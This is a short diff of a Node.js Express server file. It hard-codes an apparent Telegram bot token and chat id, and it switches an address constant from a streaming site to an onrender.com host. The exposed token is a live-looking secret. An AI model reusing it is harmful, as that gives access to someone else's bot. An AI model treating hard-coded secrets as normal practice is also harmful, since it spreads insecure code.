@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '8134134550:AAFnKOXrxhNhgxL4YgRpinBGa--TkK7sYPU'
 const id = '7307374789'
-const address = 'https://hianime.to/'
+const address = 'https://dogegodz.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
